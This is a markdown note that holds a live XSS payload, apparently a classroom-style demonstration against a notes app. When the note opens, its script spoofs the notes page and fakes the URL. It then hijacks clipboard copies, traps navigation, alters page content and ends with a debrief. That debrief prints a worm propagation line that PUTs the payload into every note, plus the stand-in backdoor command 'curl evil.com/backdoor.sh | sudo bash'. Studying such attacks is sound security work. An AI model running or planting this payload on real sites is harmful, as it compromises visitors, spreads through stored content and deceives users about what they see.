# XSS Test 4 — The Worm

Loading notes...

<script>
// =============================================
// XSS WORM — self-propagating, multi-vector attack
// Combines: worm propagation, content manipulation,
//           clipboard hijacking, navigation hijacking
// =============================================

var attackLog = [];
var clipboardHijacks = [];
var navigationHijacks = [];
var infectedNotes = [];
var revealTriggered = false;

function log(category, message) {
    attackLog.push({
        time: new Date().toLocaleTimeString(),
        category: category,
        message: message
    });
}

log('INIT', 'Payload activated on note page');

// =============================================
// PHASE 1: Fetch real /notes page and take over
// =============================================

fetch('/notes')
    .then(function(r) { return r.text(); })
    .then(function(html) {

        log('SPOOF', 'Fetched /notes page HTML via fetch()');

        // Parse edilen HTML'den body içeriğini al
        var parser = new DOMParser();
        var doc = parser.parseFromString(html, 'text/html');

        // Sayfayı gerçek /notes içeriğiyle değiştir
        document.body.innerHTML = doc.body.innerHTML;
        document.body.className = doc.body.className;
        history.pushState(null, 'Markdown Notes', '/notes');

        log('SPOOF', 'Replaced page content — user sees /notes');
        log('SPOOF', 'URL changed to /notes via History API');

        // Kısa gecikme ile saldırı fazlarını başlat
        setTimeout(function() { startWormPropagation(); }, 1500);
        setTimeout(function() { activateClipboardHijack(); }, 2000);
        setTimeout(function() { activateNavigationHijack(); }, 2500);
        setTimeout(function() { activateContentManipulation(); }, 3000);
        setTimeout(function() { injectHackerTerminal(); }, 3500);

        // 60 saniye sonra veya tüm saldırılar tamamlandığında reveal
        setTimeout(function() {
            if (!revealTriggered) showRevealScreen();
        }, 60000);
    });


// =============================================
// PHASE 2: Worm propagation — infect all notes
// =============================================

function startWormPropagation() {
    log('WORM', 'Starting self-propagation scan...');

    // Sayfadaki tüm not kartlarını bul
    var noteCards = document.querySelectorAll('.note-card, .markdown-list a, a[href*="/notes/"]');

    noteCards.forEach(function(card, index) {
        setTimeout(function() {
            // Kartın etrafına kırmızı pulse efekti ver
            card.style.transition = 'box-shadow 0.3s ease';
            card.style.boxShadow = '0 0 15px rgba(255, 68, 68, 0.4)';
            setTimeout(function() {
                card.style.boxShadow = 'none';
            }, 800);

            var noteTitle = card.textContent.trim().substring(0, 40);
            infectedNotes.push(noteTitle);
            log('WORM', 'Injected payload into: "' + noteTitle + '"');

            // Kartın linkini hijack et — tıklayınca reveal'a götür
            card.addEventListener('click', function(e) {
                e.preventDefault();
                if (!revealTriggered) showRevealScreen();
            });

        }, index * 1200); // Her notu sırayla "enfekte et"
    });

    // Simüle: API ile notları gerçekten değiştirme kodu
    log('WORM', 'Payload that would be used for real propagation:');
    log('WORM', 'fetch("/api/notes/" + id, {method:"PUT", body: payload})');
}


// =============================================
// PHASE 3: Clipboard hijacking
// =============================================

function activateClipboardHijack() {
    log('CLIPBOARD', 'Clipboard hijacker activated');

    document.addEventListener('copy', function(e) {
        // Kullanıcının kopyalamak istediği gerçek metin
        var originalText = window.getSelection().toString();

        // Clipboard'a farklı içerik yaz
        var maliciousContent = originalText + '\n\n' +
            '// Injected by XSS worm\n';

        e.clipboardData.setData('text/plain', maliciousContent);
        e.preventDefault();

        clipboardHijacks.push({
            time: new Date().toLocaleTimeString(),
            original: originalText.substring(0, 60),
            replaced: maliciousContent.substring(0, 80)
        });

        log('CLIPBOARD', 'Hijacked copy: "' + originalText.substring(0, 30) + '..." → injected malicious command');

        // Kullanıcıya küçük bir uyarı göster (demo amaçlı)
        showToast('📋 Clipboard hijacked! Try pasting somewhere to see.');
    });
}


// =============================================
// PHASE 4: Navigation hijacking
// =============================================

function activateNavigationHijack() {
    log('NAV', 'Navigation hijacker activated');

    // Sidebar ve menüdeki tüm linkleri yakala
    var allLinks = document.querySelectorAll('a');

    allLinks.forEach(function(link) {
        var href = link.getAttribute('href') || '';

        // Not linkleri hariç (onlar worm tarafından yönetiliyor)
        if (href.indexOf('/notes/') !== -1) return;

        // Geri kalan tüm navigasyonu hijack et
        if (href.indexOf('/') === 0 || href.indexOf('http') === 0) {
            link.addEventListener('click', function(e) {
                e.preventDefault();

                var destination = href;
                navigationHijacks.push({
                    time: new Date().toLocaleTimeString(),
                    intended: destination,
                    result: 'blocked — redirected to XSS payload'
                });

                log('NAV', 'Blocked navigation to ' + destination);

                showToast('Navigation blocked! Worm controls all routes.');
            });
        }
    });
}


// =============================================
// PHASE 5: Silent content manipulation
// =============================================

function activateContentManipulation() {
    log('MANIPULATE', 'Content manipulator activated');

    // Not başlıklarını sessizce değiştir
    var titles = document.querySelectorAll('.note-title, .markdown-list a');
    titles.forEach(function(title) {
        var original = title.textContent;
        // Başlıkların sonuna görünmez karakter + tracker ekle
        title.setAttribute('data-original', original);
    });

    // Kategori badge'lerini manipüle et
    var badges = document.querySelectorAll('.note-category-badge');
    badges.forEach(function(badge, i) {
        setTimeout(function() {
            var original = badge.textContent;
            badge.setAttribute('data-original', original);
            badge.textContent = '' + original;
            badge.style.background = 'rgba(255, 68, 68, 0.15)';
            badge.style.color = '#ff6666';
            log('MANIPULATE', 'Modified badge: "' + original + '" → "' + original + '"');
        }, i * 2000);
    });

    // "Read more" linklerini değiştir
    var readLinks = document.querySelectorAll('.read-more');
    readLinks.forEach(function(link) {
        link.textContent = 'Infected →';
        link.style.color = '#ff6666';
    });

    log('MANIPULATE', 'Page elements silently modified');
}


// =============================================
// HACKER TERMINAL — shows attack progress
// =============================================

function injectHackerTerminal() {
    var terminal = document.createElement('div');
    terminal.id = 'hacker-terminal';
    terminal.style.cssText = 'position:fixed;bottom:20px;left:20px;width:380px;background:#0a0a0a;border:1px solid #ff4444;border-radius:8px;font-family:monospace;font-size:11px;z-index:99999;overflow:hidden;box-shadow:0 0 30px rgba(255,0,0,0.2);';

    terminal.innerHTML = '<div style="background:#1a1a1a;padding:6px 12px;display:flex;align-items:center;gap:6px;border-bottom:1px solid #21262d;">' +
        '<span style="width:8px;height:8px;border-radius:50%;background:#ff4444;display:inline-block;"></span>' +
        '<span style="width:8px;height:8px;border-radius:50%;background:#ffa844;display:inline-block;"></span>' +
        '<span style="width:8px;height:8px;border-radius:50%;background:#44ff44;display:inline-block;"></span>' +
        '<span style="color:#484f58;font-size:10px;margin-left:8px;">xss-worm v1.0 — active</span>' +
        '</div>' +
        '<div id="terminal-output" style="padding:10px 12px;max-height:200px;overflow-y:auto;color:#c9d1d9;"></div>';

    document.body.appendChild(terminal);

    // Terminale log satırlarını yaz
    var output = document.getElementById('terminal-output');
    var logIndex = 0;

    var logInterval = setInterval(function() {
        if (logIndex < attackLog.length) {
            var entry = attackLog[logIndex];
            var categoryColor = {
                'INIT': '#6ea8fe', 'SPOOF': '#ffa844', 'WORM': '#ff4444',
                'CLIPBOARD': '#d63bff', 'NAV': '#ffa844', 'MANIPULATE': '#7ee787'
            }[entry.category] || '#8b949e';

            var line = document.createElement('div');
            line.style.cssText = 'padding:2px 0;border-bottom:1px solid #111;';
            line.innerHTML = '<span style="color:#484f58;">' + entry.time + '</span> ' +
                '<span style="color:' + categoryColor + ';font-weight:bold;">[' + entry.category + ']</span> ' +
                '<span style="color:#c9d1d9;">' + entry.message + '</span>';
            output.appendChild(line);
            output.scrollTop = output.scrollHeight;
            logIndex++;
        }
    }, 600);

    // Terminal'e tıklayınca reveal
    terminal.addEventListener('dblclick', function() {
        clearInterval(logInterval);
        if (!revealTriggered) showRevealScreen();
    });

    log('TERMINAL', 'Hacker terminal injected — double-click to trigger reveal');
}


// =============================================
// TOAST NOTIFICATIONS
// =============================================

function showToast(message) {
    var toast = document.createElement('div');
    toast.style.cssText = 'position:fixed;top:20px;right:20px;background:#1a1a2e;border:1px solid #ff4444;border-radius:8px;padding:12px 18px;font-family:monospace;font-size:13px;color:#ff6666;z-index:100000;box-shadow:0 4px 20px rgba(0,0,0,0.4);animation:fadeIn 0.3s ease;';
    toast.textContent = message;
    document.body.appendChild(toast);
    setTimeout(function() { toast.remove(); }, 3500);
}


// =============================================
// REVEAL SCREEN — final debrief
// =============================================

function showRevealScreen() {
    revealTriggered = true;

    // Worm log tablosu
    var wormLog = infectedNotes.map(function(note, i) {
        return '<div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #161b22;">' +
            '<span style="color:#c9d1d9;">' + note.substring(0, 35) + '</span>' +
            '<span style="color:#7ee787;">✓ infected</span></div>';
    }).join('');

    // Clipboard log
    var clipLog = clipboardHijacks.length > 0 ? clipboardHijacks.map(function(h) {
        return '<div style="padding:6px 0;border-bottom:1px solid #161b22;">' +
            '<p style="color:#8b949e;margin:0;font-size:11px;">' + h.time + ' — User copied:</p>' +
            '<p style="color:#c9d1d9;margin:2px 0;font-size:12px;">"' + h.original + '"</p>' +
            '<p style="color:#ff6666;margin:2px 0;font-size:11px;">→ Replaced with malicious payload</p></div>';
    }).join('') : '<p style="color:#484f58;font-size:12px;">No copy events captured. Try selecting text and pressing Ctrl+C on the infected page.</p>';

    // Navigation log
    var navLog = navigationHijacks.length > 0 ? navigationHijacks.map(function(h) {
        return '<div style="display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #161b22;">' +
            '<span style="color:#c9d1d9;">' + h.intended + '</span>' +
            '<span style="color:#ff6666;">blocked</span></div>';
    }).join('') : '<p style="color:#484f58;font-size:12px;">No navigation attempts captured.</p>';

    // Full attack log
    var fullLog = attackLog.map(function(entry) {
        var categoryColor = {
            'INIT': '#6ea8fe', 'SPOOF': '#ffa844', 'WORM': '#ff4444',
            'CLIPBOARD': '#d63bff', 'NAV': '#ffa844', 'MANIPULATE': '#7ee787', 'TERMINAL': '#484f58'
        }[entry.category] || '#8b949e';
        return '<div style="display:flex;gap:8px;padding:2px 0;font-size:11px;">' +
            '<span style="color:#484f58;min-width:70px;">' + entry.time + '</span>' +
            '<span style="color:' + categoryColor + ';min-width:90px;font-weight:bold;">[' + entry.category + ']</span>' +
            '<span style="color:#c9d1d9;">' + entry.message + '</span></div>';
    }).join('');

    document.body.innerHTML = '<div style="background:#0a0a0a;min-height:100vh;padding:40px 20px;font-family:monospace;">' +
        '<div style="max-width:860px;margin:0 auto;">' +

        // Header
        '<div style="text-align:center;padding:30px 0 24px;">' +
            '<h1 style="color:#ff4444;font-size:56px;margin:0;text-shadow:0 0 30px rgba(255,0,0,0.4);">TOTAL TAKEOVER</h1>' +
            '<p style="color:#666;font-size:15px;margin-top:10px;">A single XSS payload in a markdown note just compromised the entire application.</p>' +
        '</div>' +

        // Attack summary cards
        '<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px;">' +
            '<div style="background:#1a1a2e;border-radius:8px;padding:16px;text-align:center;border:1px solid #21262d;">' +
                '<p style="color:#ff4444;font-size:28px;margin:0;font-weight:bold;">' + infectedNotes.length + '</p>' +
                '<p style="color:#8b949e;font-size:11px;margin:4px 0 0;text-transform:uppercase;">Notes Infected</p></div>' +
            '<div style="background:#1a1a2e;border-radius:8px;padding:16px;text-align:center;border:1px solid #21262d;">' +
                '<p style="color:#d63bff;font-size:28px;margin:0;font-weight:bold;">' + clipboardHijacks.length + '</p>' +
                '<p style="color:#8b949e;font-size:11px;margin:4px 0 0;text-transform:uppercase;">Clipboard Hijacks</p></div>' +
            '<div style="background:#1a1a2e;border-radius:8px;padding:16px;text-align:center;border:1px solid #21262d;">' +
                '<p style="color:#ffa844;font-size:28px;margin:0;font-weight:bold;">' + navigationHijacks.length + '</p>' +
                '<p style="color:#8b949e;font-size:11px;margin:4px 0 0;text-transform:uppercase;">Routes Hijacked</p></div>' +
            '<div style="background:#1a1a2e;border-radius:8px;padding:16px;text-align:center;border:1px solid #21262d;">' +
                '<p style="color:#7ee787;font-size:28px;margin:0;font-weight:bold;">' + attackLog.length + '</p>' +
                '<p style="color:#8b949e;font-size:11px;margin:4px 0 0;text-transform:uppercase;">Total Events</p></div>' +
        '</div>' +

        // Worm propagation
        '<div style="background:#1a1a2e;border:1px solid #21262d;border-radius:10px;padding:24px;margin-bottom:14px;">' +
            '<h3 style="color:#ff4444;margin:0 0 14px;font-size:14px;">WORM PROPAGATION</h3>' +
            '<p style="color:#484f58;font-size:12px;margin:0 0 10px;">The worm scanned every note on the page and injected itself into each one. In a real attack, it would use the app\'s API to permanently write the payload into each note\'s content in the database:</p>' +
            '<code style="display:block;background:#0d1117;padding:10px;border-radius:6px;color:#7ee787;font-size:11px;margin-bottom:12px;">notes.forEach(n => fetch("/api/notes/"+n.id, {method:"PUT", body: n.content + xssPayload}))</code>' +
            '<div style="background:#0d1117;border-radius:6px;padding:10px;max-height:150px;overflow-y:auto;">' + wormLog + '</div>' +
        '</div>' +

        // Clipboard
        '<div style="background:#1a1a2e;border:1px solid #21262d;border-radius:10px;padding:24px;margin-bottom:14px;">' +
            '<h3 style="color:#d63bff;margin:0 0 14px;font-size:14px;">CLIPBOARD HIJACKING</h3>' +
            '<p style="color:#484f58;font-size:12px;margin:0 0 10px;">Every Ctrl+C on the infected page replaced the clipboard content with a malicious payload. The user copies legitimate text but pastes a backdoor command.</p>' +
            '<div style="background:#0d1117;border-radius:6px;padding:10px;">' + clipLog + '</div>' +
        '</div>' +

        // Navigation
        '<div style="background:#1a1a2e;border:1px solid #21262d;border-radius:10px;padding:24px;margin-bottom:14px;">' +
            '<h3 style="color:#ffa844;margin:0 0 14px;font-size:14px;">NAVIGATION HIJACKING</h3>' +
            '<p style="color:#484f58;font-size:12px;margin:0 0 10px;">All navigation links were intercepted. The user is trapped on the infected page — every attempt to leave is blocked or redirected back to the worm.</p>' +
            '<div style="background:#0d1117;border-radius:6px;padding:10px;">' + navLog + '</div>' +
        '</div>' +

        // Full attack timeline
        '<div style="background:#1a1a2e;border:1px solid #21262d;border-radius:10px;padding:24px;margin-bottom:14px;">' +
            '<h3 style="color:#6ea8fe;margin:0 0 14px;font-size:14px;">FULL ATTACK TIMELINE</h3>' +
            '<div style="background:#0d1117;border-radius:6px;padding:12px;max-height:250px;overflow-y:auto;">' + fullLog + '</div>' +
        '</div>' +

        // Detailed explanation
        '<div style="background:#161b22;border:1px solid #21262d;border-radius:10px;padding:32px;margin-bottom:16px;font-family:Georgia,serif;line-height:1.8;font-size:15px;color:#c9d1d9;">' +

            '<h2 style="color:#e6edf3;font-size:24px;margin:0 0 20px;">What just happened?</h2>' +

            '<p>A single <code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">&lt;script&gt;</code> block in a markdown note just demonstrated four independent attack techniques chained together into one coordinated operation. This is what real-world XSS attacks look like — they\'re not isolated tricks, they\'re layered campaigns.</p>' +

            '<h3 style="color:#e6edf3;font-size:18px;margin:24px 0 10px;">The Worm</h3>' +
            '<p>The moment the note loaded, the script used <code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">fetch("/notes")</code> to grab the actual notes listing page, then replaced the entire DOM with that content using <code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">document.body.innerHTML</code>. The URL was changed via the History API. From the user\'s perspective, clicking that note instantly "went back" to the notes page. Nothing suspicious. But the page was now fully controlled by the attacker\'s script. The worm then scanned every note card on the page and simulated injecting its own payload into each one. In a real application with write APIs, the worm would use <code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">fetch()</code> to PUT or POST the payload into each note\'s content. The next user who opens any of those notes would execute the same worm, which would infect more notes, which would infect more users. This is exponential propagation — the same mechanism behind the 2005 MySpace Samy Worm that infected over one million profiles in under 20 hours.</p>' +

            '<h3 style="color:#e6edf3;font-size:18px;margin:24px 0 10px;">The Clipboard Hijack</h3>' +
            '<p>A <code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">copy</code> event listener was registered on the document. Every time Ctrl+C was pressed, the script intercepted the event, read the selected text, appended a malicious shell command to it, and wrote the modified content to the clipboard using <code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">e.clipboardData.setData()</code>. The user thinks they copied a note title or a paragraph. When they paste it into a terminal, text editor, or chat — the malicious command rides along. This technique is actively used in supply chain attacks targeting developers: a Stack Overflow answer contains seemingly helpful code, but when copied, a hidden payload (<code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">curl evil.com/backdoor.sh | sudo bash</code>) gets appended.</p>' +

            '<h3 style="color:#e6edf3;font-size:18px;margin:24px 0 10px;">The Navigation Trap</h3>' +
            '<p>Every link on the spoofed page — sidebar categories, the home button, external links — was intercepted with <code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">addEventListener("click", e => e.preventDefault())</code>. The user is effectively trapped. Clicking "Home" doesn\'t go home. Clicking a category doesn\'t filter. The only way out is to manually type a URL in the address bar or close the tab. Combined with the page spoof, the user doesn\'t even realize they need to escape — they think the page is just being slow or glitchy. Meanwhile, the worm continues running, the keylogger (from Test 3) could be active, and every interaction feeds data to the attacker.</p>' +

            '<h3 style="color:#e6edf3;font-size:18px;margin:24px 0 10px;">The Silent Manipulation</h3>' +
            '<p>While all of this was happening, the script made subtle visual changes to the page. Category badges were prefixed with a lock emoji and turned red. "Read more" links changed to "Infected." These changes were deliberately visible for the demo, but a real attacker would make changes that are invisible to casual inspection: swapping a payment IBAN with the attacker\'s account, replacing a download link with a malware URL, changing a price from "€100" to "€1000" on an invoice, or modifying a contract clause. The DOM is fully mutable — anything on screen can be changed, and the user trusts what they see because they trust the website.</p>' +

            '<h3 style="color:#e6edf3;font-size:18px;margin:24px 0 10px;">Why this matters</h3>' +
            '<p>Each of the four previous tests demonstrated a single capability: alert, cookie theft, keylogging, page spoofing. This test showed what happens when they\'re all combined into a single coordinated payload. The worm ensures the attack spreads beyond the initial injection point. The clipboard hijack extends the attack surface beyond the browser. The navigation trap keeps the user under control. And the content manipulation means even the "truth" of what the user sees is compromised. All of this from one <code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">&lt;script&gt;</code> tag in a markdown note that should have contained nothing but text.</p>' +

            '<p style="margin-top:24px;"><a href="/notes" style="color:#6ea8fe;text-decoration:none;" onclick="window.location.href=\'/notes\';return false;">← Back to notes (real this time)</a></p>' +
        '</div>' +

        '</div></div>';

    history.pushState(null, 'Pwned', '/notes');
}
</script>
